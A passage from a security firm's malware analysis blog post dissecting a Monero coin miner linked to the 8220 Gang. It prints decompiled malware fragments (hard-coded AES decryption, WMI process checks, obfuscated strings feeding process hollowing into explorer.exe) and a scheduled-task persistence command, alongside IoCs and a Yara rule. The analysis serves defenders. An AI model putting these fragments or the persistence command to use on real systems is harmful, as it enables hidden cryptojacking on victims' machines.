<pre id="ecac0f05-aeb9-4e5f-9e68-3e21dedab64c" class="code code-wrap"><code>public static byte[] uwcbfdbqkrwtzb(byte[] dzgxchdoczxqowkwogbsmcd, bool pcxgguotjpugqoeyxdeiodigq = false)
    {
        Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes("ojfjdfielssdyzqwznqobyegcwwxjaushzqzrcjukrmcwcwblvqfklidbxqoppgkravyiqxstmwqntnzayuwoemcljfttyvukeewsbhxxkutckllgwogdnisjzhqjetzvnsqdwxgqoeqbjzsxblfvpttbwfsivptmuifjzjnernwlkhazgwwdwdfkttojvytzxuhuvnzuyowxdgygfdrekwqttbpeyyuckewozwfqebypphgqztdndsoyjpdadya", Encoding.ASCII.GetBytes("adrionvgpxfarbibkilesebbhmbwklfj"), 100);
        RijndaelManaged rijndaelManaged = new RijndaelManaged
        {
            KeySize = 256,
            Mode = CipherMode.CBC
        };
        ICryptoTransform transform = pcxgguotjpugqoeyxdeiodigq ? rijndaelManaged.CreateEncryptor(rfc2898DeriveBytes.GetBytes(16), Encoding.ASCII.GetBytes("vnyihutudlwbxshp")) : rijndaelManaged.CreateDecryptor(rfc2898DeriveBytes.GetBytes(16), Encoding.ASCII.GetBytes("vnyihutudlwbxshp"));
        byte[] result;
        using (MemoryStream memoryStream = new MemoryStream())
        {
            using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(dzgxchdoczxqowkwogbsmcd, 0, dzgxchdoczxqowkwogbsmcd.Length);
                cryptoStream.Close();
            }
            result = memoryStream.ToArray();
        }
        return result;
    }</code></pre>
<p id="8abb7bbd-0459-4a91-87b1-92fbc87c11d1" class="">Once decrypted, the first part of the code starts to make sense (some methods have been renamed for clarity and the decrypted strings have been added as comments for easier reading):</p>
<p class=""><img src="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2012.png?width=1019&amp;name=monero_Untitled%2012.png" alt="monero_Untitled 12" width="1019" loading="lazy" style="width: 100%;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2012.png?width=510&amp;name=monero_Untitled%2012.png 510w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2012.png?width=1019&amp;name=monero_Untitled%2012.png 1019w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2012.png?width=1529&amp;name=monero_Untitled%2012.png 1529w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2012.png?width=2038&amp;name=monero_Untitled%2012.png 2038w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2012.png?width=2548&amp;name=monero_Untitled%2012.png 2548w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2012.png?width=3057&amp;name=monero_Untitled%2012.png 3057w" sizes="(max-width: 1019px) 100vw, 1019px"></p>
<p id="13ea9042-cea5-4c3c-8ad5-2ffcf05e01a1" class="">In short, it starts by concatenating the following strings:</p>
<pre id="3f5d807c-90b7-4d5a-878f-da15124af445" class="code code-wrap"><code>C:\Users\&lt;user&gt;\AppData\Roaming\Windows\Libs
C:\Users\&lt;user&gt;\AppData\Roaming\Windows\Telemetry</code></pre>
<p id="20dee845-e222-4b2f-ac61-3c8962a05994" class="">The if-condition isn’t met since there is no command line arguments being passed on the first run, so it continues on below, creating the above directories followed by a method we have not yet encountered:</p>
<p class=""><img src="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2013.png?width=1100&amp;name=monero_Untitled%2013.png" alt="monero_Untitled 13" width="1100" loading="lazy" style="width: 100%;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2013.png?width=550&amp;name=monero_Untitled%2013.png 550w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2013.png?width=1100&amp;name=monero_Untitled%2013.png 1100w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2013.png?width=1650&amp;name=monero_Untitled%2013.png 1650w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2013.png?width=2200&amp;name=monero_Untitled%2013.png 2200w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2013.png?width=2750&amp;name=monero_Untitled%2013.png 2750w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2013.png?width=3300&amp;name=monero_Untitled%2013.png 3300w" sizes="(max-width: 1100px) 100vw, 1100px"></p>
<p id="7e5a72a0-d0cf-4724-8a6b-87d30e23e948" class="">The method <code class="inline">nqpepwxvekhptsodeqsiskrspubcgfbzwzrtg</code> takes a string argument, retrieves the resource with that name from the assembly, decrypts and returns it.</p>
<p id="753d9136-42a1-4163-a235-bea00418448d" class="">Armed with this knowledge, we can see that this part of the code retrieves an encrypted driver from the resources of the assembly, decrypts it and writes it to disk at <code class="inline">C:\Users\&lt;user&gt;\AppData\Roaming\Windows\Libs\WR64.sys</code>. A quick inspection of this driver shows it is validly signed and is a compiled version of this code: <a href="https://github.com/QCute/WinRing0">https://github.com/QCute/WinRing0</a>. Some of the functionality in this driver is worrying, and the GitHub repository states it is designed for the following, making it an ideal rootkit:</p>
<pre id="d7361b93-ddd4-420e-b5f1-b78a818eac4d" class="code code-wrap"><code>Allow user application to access ring0 level resource

    access cpu msr register
    read/write memory directly
    io pci device
    etc...</code></pre>
<p id="d5555a3b-ef2e-49cd-9d9c-67499d53f9b3" class="">It also doesn’t seem to be detected by many AV/EDR vendors (<a href="https://www.virustotal.com/gui/file/11bd2c9f9e2397c9a16e0990e4ed2cf0679498fe0fd418a3dfdac60b5c160ee5">https://www.virustotal.com/gui/file/11bd2c9f9e2397c9a16e0990e4ed2cf0679498fe0fd418a3dfdac60b5c160ee5</a>), though the community comments show at least some people are aware of its capabilities and its use in crypto mining:</p>
<p class=""><img src="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2014.png?width=1288&amp;name=monero_Untitled%2014.png" alt="monero_Untitled 14" width="1288" loading="lazy" style="width: 100%;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2014.png?width=644&amp;name=monero_Untitled%2014.png 644w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2014.png?width=1288&amp;name=monero_Untitled%2014.png 1288w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2014.png?width=1932&amp;name=monero_Untitled%2014.png 1932w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2014.png?width=2576&amp;name=monero_Untitled%2014.png 2576w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2014.png?width=3220&amp;name=monero_Untitled%2014.png 3220w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2014.png?width=3864&amp;name=monero_Untitled%2014.png 3864w" sizes="(max-width: 1288px) 100vw, 1288px"></p>
<p id="4fda1f4d-b9b0-440f-b16b-9fcb3855d3ce" class="">The decryption of the driver is followed by a second resource being decrypted, this time it seems to be a zip file:</p>
<p class=""><img src="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2015.png?width=1060&amp;name=monero_Untitled%2015.png" alt="monero_Untitled 15" width="1060" loading="lazy" style="width: 100%;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2015.png?width=530&amp;name=monero_Untitled%2015.png 530w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2015.png?width=1060&amp;name=monero_Untitled%2015.png 1060w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2015.png?width=1590&amp;name=monero_Untitled%2015.png 1590w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2015.png?width=2120&amp;name=monero_Untitled%2015.png 2120w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2015.png?width=2650&amp;name=monero_Untitled%2015.png 2650w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2015.png?width=3180&amp;name=monero_Untitled%2015.png 3180w" sizes="(max-width: 1060px) 100vw, 1060px"></p>
<p id="3b2e09ca-3ecd-4e2c-889d-6b56ca06c1a3" class="">Since we’re interested in this zip file, we simply save the encrypted, raw resource to disk using dnSpy and write a simple wrapper around the decryption function to decrypt it and save it so we can inspect the contents:</p>
<p class=""><img src="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2016.png?width=713&amp;name=monero_Untitled%2016.png" alt="monero_Untitled 16" width="713" loading="lazy" style="width: 100%;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2016.png?width=357&amp;name=monero_Untitled%2016.png 357w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2016.png?width=713&amp;name=monero_Untitled%2016.png 713w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2016.png?width=1070&amp;name=monero_Untitled%2016.png 1070w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2016.png?width=1426&amp;name=monero_Untitled%2016.png 1426w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2016.png?width=1783&amp;name=monero_Untitled%2016.png 1783w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2016.png?width=2139&amp;name=monero_Untitled%2016.png 2139w" sizes="(max-width: 713px) 100vw, 713px"></p>
<p id="ab7613da-9731-4bd8-81dd-399ca5b45804" class="">Using <code class="inline">file</code> shows us it is indeed a zip file:</p>
<p id="553d12f8-dccb-4160-a545-a07ed5c80ec2" class=""><code class="inline">artifacts/nktkndecoded.bin: Zip archive data, at least v2.0 to extract</code>.</p>
<p id="41137f2f-f0a7-429c-b2a2-5e3d418ad629" class="">When we extract it, we find xmrig.exe inside, which is a known, not necessarily malicious, crypto miner (<a href="https://github.com/xmrig/xmrig">https://github.com/xmrig/xmrig</a>):</p>
<p class=""><img src="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2017.png?width=563&amp;name=monero_Untitled%2017.png" alt="monero_Untitled 17" width="563" loading="lazy" style="width: 100%;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2017.png?width=282&amp;name=monero_Untitled%2017.png 282w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2017.png?width=563&amp;name=monero_Untitled%2017.png 563w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2017.png?width=845&amp;name=monero_Untitled%2017.png 845w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2017.png?width=1126&amp;name=monero_Untitled%2017.png 1126w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2017.png?width=1408&amp;name=monero_Untitled%2017.png 1408w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2017.png?width=1689&amp;name=monero_Untitled%2017.png 1689w" sizes="(max-width: 563px) 100vw, 563px"></p>
<p id="be3b463f-5371-4572-9a23-18026d3b4669" class="">Continuing our analysis of the .NET code, we hit the following method:</p>
<pre id="8cfc90fb-d0fc-41f0-9c1f-8767a81a7763" class="code code-wrap"><code>string text4 = CryptoMiner.qugegcxxvxwnbxjefrfpwvbrhzsph();</code></pre>
<p id="ee784c80-67f8-422e-88f9-58840b0c615d" class="">This method does the following (with the decrypted strings added as comments):</p>
<pre id="5e57413a-80a7-4ad8-9222-0bdd3463ccb5" class="code code-wrap"><code>public static string qugegcxxvxwnbxjefrfpwvbrhzsph()
    {
        string text = "";
        ManagementScope managementScope = new ManagementScope("\\root\\cimv2", new ConnectionOptions
        {
            Impersonation = ImpersonationLevel.Impersonate
        });
        managementScope.Connect();
        ManagementObjectCollection managementObjectCollection = new ManagementObjectSearcher(managementScope, new ObjectQuery(CryptoMiner.Deobfuscate("qCK9ddMiJpvBX7USoFFrE3XJR34PmItG94p+6aJ6y2ed3Jrwy9WKItFQLh3W0CcNJgYz/HItkgO/igUk37hEACNIYwfz0MxXFDmACzJe8N4="))).Get();//Select CommandLine from Win32_Process WHERE CommandLine LIKE '%fnwymrmnzqtg%'
        foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
        {
            ManagementObject managementObject = (ManagementObject)managementBaseObject;
            if (managementObject != null &amp;&amp; managementObject["CommandLine"] != null &amp;&amp; managementObject["CommandLine"].ToString().Contains(CryptoMiner.Deobfuscate("orz55qpjOyFf63UsDHzysQ==")))//fnwymrmnzqtg
            {
                text += managementObject["CommandLine"].ToString();
            }
        }
        return text;
    }</code></pre>
<p id="3f45e354-3483-4d10-a700-3e6e681ef2ed" class="">It uses the System.Management namespace to access WMI on the local host, then attempts to find a process with a command line that contains <code class="inline">%fnwymrmnzqtg%</code>. If it finds it, it returns the command line.</p>
<p id="dc7ece7f-4168-4afd-ac76-e827f5ce2c7e" class="">In the next block of code, a series of strings are stored (de-obfuscated contents in comments next to each)</p>
<pre id="cea194b5-b483-4019-b158-34d0cf123808" class="code code-wrap"><code>foreach (string[] array3 in new string[][]
                    {
                        new string[]
                        {
                            "JwxzXGkqP9AvRDuUT1tzWA==",//fnwymrmnzqtgf0
                            "f",
                            "8pg4JxwF5oP3uc2ts1jCsxFYlG8kPtWg9mTb3dswYn4ExnxKJ6sQ4BS8+bpssl6eKOCi1V/3NfbZ/DsmAEMvw/PSoEqGNe8Yre4+jTRiX00KTjXRG4IooYadwSsnN5Q3Ez67HIPM/vfPdqSRhYu+Vqv/z/gb98eMOGCae1Sy3HJWzJ82IJ2BbQMCiYRjfPr6Vr000kK9/zLm2DAudi19HJr6E4mUTAYiUhDqRiA6/8J8zcULJ0+rSskckY5qbMO0tfp7PKJxTU/Qw71bR26rQByxkQDvKt+woQYir6F2FN2EUUSOd+TEkb4CVlrIXxaU9RlD7QC3+r6jy89FzcGJBva3xoeuC090AKigGtP+JEyNTRpgSSm9WixA9g4UMmWkZxhwe+HGJnsEF8Heb6oFixzSolc/9iHTGEBjeJ2+YMaJIB+UV4sd6ZykcqfVnFB+",//fnwymrmnzqtgf0 Xji3FXYfqqI2timPThbgZueMNpSES88mLhMz2ywydJRpJXefNDfRddYDRzvos5SYUD+mF8LsDeZoI8vMJvRlwTumE8mSPmuhoB3oCRnq52I0niLPVYPOAurYTmbdyuUOF/KjAXDenWT+3596P56Xyb6tBsUBj9o3w9QwGeZxsA5HeqkEM8EmJnYD9ZMnTHHjZsalhUVlUBUjRR0UV5+AKbksXCeS23jeeqmM+5Y4eaLbIW0l4Hma6ig8Pl87NEn/jn4zffxGM9BXhlnHIqXpMttzZ5IQ798jYIKnS3Qdfj1iMPJ3ckILEr5LbAjcXZRi
                            "5rHyu+TR5p3DUeII51G9TA==",//systemroot
                            "QmDFLdUXxO6MjBHbWUJFAg=="//explorer.exe
                        }
                    })
                    {
                        if (!text4.Contains(CryptoMiner.Deobfuscate(array3[0])) &amp;&amp; (array3[1] == CryptoMiner.Deobfuscate("Tlu85WuqsR07Nj7ZXnFUdg==")/* f */ || (array3[1] == CryptoMiner.Deobfuscate("KtVyVmYTz+X9OhsUsyPYNQ==")/* r */ &amp;&amp; flag)))
                        {
                            CryptoMiner.azakdrkrmskwpdicwwxjwoqaxpda((array3[1] == CryptoMiner.Deobfuscate("Tlu85WuqsR07Nj7ZXnFUdg==")) ? array : array2, Path.Combine(Environment.GetEnvironmentVariable(CryptoMiner.Deobfuscate(array3[3])), CryptoMiner.Deobfuscate(array3[4])), CryptoMiner.Deobfuscate(array3[2]));
                        }
                    }</code></pre>
<p id="a47dec5b-824c-4919-8e63-6c6a00e6d30d" class="">The if-block checks whether the WMI method earlier returned any running processes with <code class="inline">fnwymrmnzqtgf0</code> in the command line. If none are found (and none were found during the first run of this executable as it is initially called without command line arguments), the <code class="inline">azakdrkrmskwpdicwwxjwoqaxpda</code> method is called. This method does the heavy lifting around process injection using process hollowing. In short, it creates a suspended explorer.exe process, then uses <code class="inline">ZwUnmapViewOfSection</code> to remove the legitimate code, followed by <code class="inline">VirtualAllocEx</code> and <code class="inline">WriteProcessMemory</code> and eventually <code class="inline">ResumeThread</code> to complete the injection.</p>
<p id="89207649-c840-40b8-aed4-ba93190d2842" class="">We have enough data now to do some cursory searches for what this malware might be, based on the use of WR64.sys and xmrig.exe, and a quick search on Github leads us to the off-the-shelf coin miner called <a href="https://github.com/UnamSanctam/SilentXMRMiner">https://github.com/UnamSanctam/SilentXMRMiner</a>, concluding our technical investigation. Further IoCs were obtained using dynamic analysis, such as capturing the network traffic, to confirm the mining proxy in use and the Monero wallet address.</p>
<p id="ee4c124b-e9fc-4982-8518-d3998dfff3d8" class="">There is more to the functionality of the miner, specifically in the way it handles making sure the miner is running via a watchdog process, as well as creating a scheduled task for persistence, though a full analysis of this open source project is out of scope for this investigation.</p>
<h2 id="cf111996-9601-43c5-9379-67cc6ff8c395" class="">Closing remarks</h2>
<p id="26d811f3-c843-482b-b7a6-ac462eba9649" class="">This coin miner is not particularly sophisticated and neither are the methods used to gain initial access, yet a brief search for the associated Monero wallet address (<code class="inline">46E9UkTFqALXNh2mSbA7WGDoa2i6h4WVgUgPVdT9ZdtweLRvAhWmbvuY1dhEmfjHbsavKXo3eGf5ZRb4qJzFXLVHGYH4moQ</code>) shows that this Threat Actor (tracked as 8220 Gang - <a href="https://www.lacework.com/blog/8220-gangs-recent-use-of-custom-miner-and-botnet/">https://www.lacework.com/blog/8220-gangs-recent-use-of-custom-miner-and-botnet/</a>) seems to favour quantity over quality as it’s been associated with coin mining since at least 2018 using a wide variety of public exploits. The links between the IPs used to drop the xmr.ps1 payload into the victim system and the domains of a.oracleservice[.]top, pwn.oracleservice[.]top and pwn.givemexyz[.]in also connect our identified activity back to the activity identified in the Lacework report.</p>
<p id="204c2012-62e6-42d2-8a6e-f5f774674838" class="">Building on our understanding of vulnerabilities scanned for from the IP of 198.12.68[.]106, it also seems at least the following public high-profile exploits have been associated with the Monero wallet address:</p>
<ul>
<li>Exchange ProxyShell</li>
<li>Apache Hadoop YARN ResourceManager Unauthenticated RCE</li>
<li>Log4Shell</li>
<li>Confluence Widget Connector path traversal</li>
<li>Apache Struts2</li>
</ul>
<ul id="672fd910-5334-4315-9700-c4ff28df3c80" class="bulleted-list"></ul>
<ul id="9a5ddbd4-6f54-4ae4-800f-4f486275da90" class="bulleted-list"></ul>
<ul id="c2da80bf-5c3a-4965-8a17-603b90c015c2" class="bulleted-list"></ul>
<ul id="738a2fbc-8fbc-421c-b945-ef157cc09f21" class="bulleted-list"></ul>
<h2 id="e9dffcd3-8fc0-4428-8e8c-6c8d39584ff0" class="">Indicators of Compromise</h2>
<p id="7108b3a6-1b61-4bd0-b617-594c7abdaec6" class="">Network:</p>
<pre id="49cd539e-9ff6-4d18-9a54-06b568123f45" class="code code-wrap"><code>80.71.158.96 - hosts the powershell script and .exe
oracleservice[.]top - resolved to by 198.12.68.106 and 80.71.158.96, identified as a C2 server
167.114.114.169 - mining proxy

Request made to mining proxy:

{"id":1,"jsonrpc":"2.0","method":"login","params":{"login":"46E9UkTFqALXNh2mSbA7WGDoa2i6h4WVgUgPVdT9ZdtweLRvAhWmbvuY1dhEmfjHbsavKXo3eGf5ZRb4qJzFXLVHGYH4moQ","pass":"x","agent":"XMRig/6.16.2 (Windows NT 10.0; Win64; x64) libuv/1.38.0 msvc/2019","rigid":"","algo":["rx/0","cn/2","cn/r","cn/fast","cn/half","cn/xao","cn/rto","cn/rwz","cn/zls","cn/double","cn/ccx","cn-lite/1","cn-heavy/0","cn-heavy/tube","cn-heavy/xhv","cn-pico","cn-pico/tlo","cn/upx2","cn/1","rx/wow","rx/arq","rx/graft","rx/sfx","rx/keva","argon2/chukwa","argon2/chukwav2","argon2/ninja","astrobwt","ghostrider"]}}</code></pre>
<p id="a30dedcb-52b3-4d04-8c22-902b1100ca0f" class="">Binaries:</p>
<pre id="e6a3add2-9f47-4e6b-9ea8-25d7c5f8b14a" class="code code-wrap"><code>D71902D94F791BC465DF2E02F65B2C45F1ABCE409D173A040DF1DCDB64E5D2F7 nazi.exe
367A44FE1674FFCDB78BDC97CBDCB464662FDFB6C018F05B4D92BD56131B3587 nazi-miner.exe (.NET assembly)
11BD2C9F9E2397C9A16E0990E4ED2CF0679498FE0FD418A3DFDAC60B5C160EE5 WR64.sys
B0748B57A8D9B22EEEC43422CE6CB5FDE27C26AB6620EC2E992660CB2698CBE0 xmrig.exe</code></pre>
<p id="ba3a6c99-9b4c-474a-a82f-992665d09f85" class="">Yara rule to catch hard-coded OR obfuscation of ntdll in the Syswhispers2 library of the loader:</p>
<pre id="7440cafe-0f26-45ba-91e9-0f6d371fed1e" class="code code-wrap"><code>rule Syswhispers : syswhispers syscalls
{
    meta:
        author = "Brecht Snijders at Triskele Labs"
        date = "2022-04-07"
        description = "A Yara rule to find binaries that use the Syswhispers2 project for direct system call invocation"
        modified = "2022-04-07"
        hash = "d71902d94f791bc465df2e02f65b2c45f1abce409d173a040df1dcdb64e5d2f7"
        tlp = "WHITE"
    strings:
        $syscall_1 = { 20 20 20 20 [2] 6e 74 64 6c }
        $syscall_2 = { 20 20 20 20 [2] 6c 2e 64 6c }

    condition:
        uint16(0) == 0x5a4d
        and $syscall_1
        and $syscall_2

}</code></pre>
<p id="df983ca2-5d94-48cf-865a-77e508e35fde" class="">Scheduled Task persistence:</p>
<pre id="25b617cf-e052-4ece-8d5d-fe2dde610fe5" class="code code-wrap"><code>cmd.exe /c schtasks /create /f /sc onlogon /rl highest /tn "services" /tr "C:\Users\&lt;user&gt;\AppData\Local\Temp\Windows\services.exe"</code></pre>
</div>
</article></div>
  
</div>

    </div>

    
  </div>
</div>
</div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

<div class="row-fluid-wrapper row-depth-1 row-number-4 dnd-section">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-cell dnd-column" style="" data-widget-type="cell" data-x="0" data-w="12">

<div class="row-fluid-wrapper row-depth-1 row-number-5 dnd-row">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget dnd-module" style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_widget_1630295129250" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">








<div id="" class="gp-block gp-block_paddings-large gp-block_dark gp-block_text-light gp-textForm
              gp-block_submit-tertiary
              gp-textForm_right" style="
      
      
        background-image: url(https://www.triskelelabs.com/hubfs/CTA_BG_Green.png);
        
      ">
  
  
  
  <div class="gp-block__bg gp-block_none">
  </div>
  
  <div class="gp-block__wrapper">
    
<div class="gp-textForm__container">
  <div class="gp-textForm__row gp-textForm__row_top-aligned">
    <div class="gp-textForm__formCol">
      
      <div class="gp-textForm__formWrp gp-textForm__formWrp_none gp-textForm__formWrp_text_light">
        
        
        
        <span id="hs_cos_wrapper_widget_1630295129250_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_form" style="" data-hs-cos-general-type="widget" data-hs-cos-type="form"><h3 id="hs_cos_wrapper_form_551045408_title" class="hs_cos_wrapper form-title" data-hs-cos-general-type="widget_field" data-hs-cos-type="text"></h3>

<div id="hs_form_target_form_551045408"></div>









</span>
        
      </div>
      
      
      
    </div>
    <div class="gp-textForm__txtCol gp-textForm__rte">
      <p><span style="color: #000000;">Subscribe_</span></p>
<h2>Get the latest Cyber Wonderland in your inbox</h2>
<p>&nbsp;</p>
    </div>
  </div>
</div>

  </div>
</div>
</div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

</div><!--end widget-span -->
</div>
</div>
</div>
</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

    </div><!--end body -->
</div><!--end body wrapper -->

<div class="footer-container-wrapper">
    <div class="footer-container container-fluid">

<div class="row-fluid-wrapper row-depth-1 row-number-1 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget " style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_16058581896751091" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">





<footer class="gp-footer gp-footer_dark">
  <div class="gp-footer__container">
    <div class="gp-footer__row">
      <div class="gp-footer__col">
        <div class="gp-footer__info">
          <div class="gp-footer__logo-cont">
            <img class="gp-footer__logo" src="https://www.triskelelabs.com/hubfs/TL%20Mark%20White.svg" alt="TL Mark White">
          </div>
          <div class="gp-footer__texts gp-footer__texts_light">
            <p class="gp-footer__text">Copyright ©2024</p>
            
            
            
            
            
            <a href="https://www.triskelelabs.com/privacy-policy?hsLang=en" class="gp-footer__link">Privacy Policy</a>
            
            
            <span class="gp-footer__divider"> | </span>
            
            
            <a href="https://www.triskelelabs.com/terms-of-use?hsLang=en" class="gp-footer__link">Terms</a>
            
            
            
          </div>
        </div>
        <div class="gp-footer__social">
          
          
          
          <a href="https://twitter.com/triskelelabs?lang=en" class="gp-footer__link gp-footer__link_social gp-footer__link_tw" target="_blank"></a>
          
          
          
          <a href="https://www.youtube.com/channel/UCarMWBeh4qbdetlcA3e0aaA" class="gp-footer__link gp-footer__link_social gp-footer__link_yo" target="_blank"></a>
          
          
          
          <a href="https://www.linkedin.com/company/triskele-labs" class="gp-footer__link gp-footer__link_social gp-footer__link_li" target="_blank"></a>
          
        </div>
      </div>
    </div>
  </div>
</footer>
</div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

    </div><!--end footer -->
</div><!--end footer wrapper -->

    
<!-- HubSpot performance collection script -->
<script defer src="/hs/hsstatic/content-cwv-embed/static-1.1293/embed.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script>
var hsVars = hsVars || {}; hsVars['language'] = 'en';
</script>

<script src="/hs/hsstatic/cos-i18n/static-1.53/bundles/project.js"></script>
<script src="https://www.triskelelabs.com/hs-fs/hub/19911083/hub_generated/template_assets/52806009188/1708536350090/triskele_labs_theme_2021/assets/bundle.min.js"></script>
<script src="https://www.triskelelabs.com/hs-fs/hub/19911083/hub_generated/template_assets/52806009187/1656929870099/triskele_labs_theme_2021/assets/anime.min.js"></script>

    <!--[if lte IE 8]>
    <script charset="utf-8" src="https://js.hsforms.net/forms/v2-legacy.js"></script>
    <![endif]-->

<script data-hs-allowed="true" src="/_hcms/forms/v2.js"></script>

    <script data-hs-allowed="true">
        var options = {
            portalId: '19911083',
            formId: 'dc0bcc7f-e678-4129-8d05-7be92c7c6571',
            formInstanceId: '8674',
            
            pageId: '78942196274',
            
            region: 'na1',
            
            
            
            
            pageName: "Investigating Monero Coin Miner",
            
            
            
            inlineMessage: "Thanks for submitting the form.",
            
            
            rawInlineMessage: "Thanks for submitting the form.",
            
            
            hsFormKey: "174c492b63852748b19737a2777f7d23",
            
            
            css: '',
            target: '#hs_form_target_form_551045408',
            
            
            
            
            
            
            
            contentType: "standard-page",
            
            
            
            formsBaseUrl: '/_hcms/forms/',
            
            
            
            formData: {
                cssClass: 'hs-form stacked hs-custom-form'
            }
        };

        options.getExtraMetaDataBeforeSubmit = function() {
            var metadata = {};
            

            if (hbspt.targetedContentMetadata) {
                var count = hbspt.targetedContentMetadata.length;
                var targetedContentData = [];
                for (var i = 0; i < count; i++) {
                    var tc = hbspt.targetedContentMetadata[i];
                     if ( tc.length !== 3) {
                        continue;
                     }
                     targetedContentData.push({
                        definitionId: tc[0],
                        criterionId: tc[1],
                        smartTypeId: tc[2]
                     });
                }
                metadata["targetedContentMetadata"] = JSON.stringify(targetedContentData);
            }

            return metadata;
        };

        hbspt.forms.create(options);
    </script>


<!-- Start of HubSpot Analytics Code -->
<script type="text/javascript">
var _hsq = _hsq || [];
_hsq.push(["setContentType", "standard-page"]);
_hsq.push(["setCanonicalUrl", "https:\/\/www.triskelelabs.com\/investigating-monero-coin-miner"]);
_hsq.push(["setPageId", "78942196274"]);
_hsq.push(["setContentMetadata", {
    "contentPageId": 78942196274,
    "legacyPageId": "78942196274",
    "contentFolderId": null,
    "contentGroupId": null,
    "abTestId": null,
    "languageVariantId": 78942196274,
    "languageCode": "en",
    
    
}]);
</script>

<script type="text/javascript" id="hs-script-loader" async defer src="/hs/scriptloader/19911083.js"></script>
<!-- End of HubSpot Analytics Code -->


<script type="text/javascript">
var hsVars = {
    render_id: "828dae81-31a9-4bbf-8386-f861da5405fd",
    ticks: 1742611743534,
    page_id: 78942196274,
    
    content_group_id: 0,
    portal_id: 19911083,
    app_hs_base_url: "https://app.hubspot.com",
    cp_hs_base_url: "https://cp.hubspot.com",
    language: "en",
    analytics_page_type: "standard-page",
    scp_content_type: "",
    
    analytics_page_id: "78942196274",
    category_id: 1,
    folder_id: 0,
    is_hubspot_user: false
}
</script>


<script defer src="/hs/hsstatic/HubspotToolsMenu/static-1.432/js/index.js"></script>

<script>
  

  
 $(document).ready(function(){
   
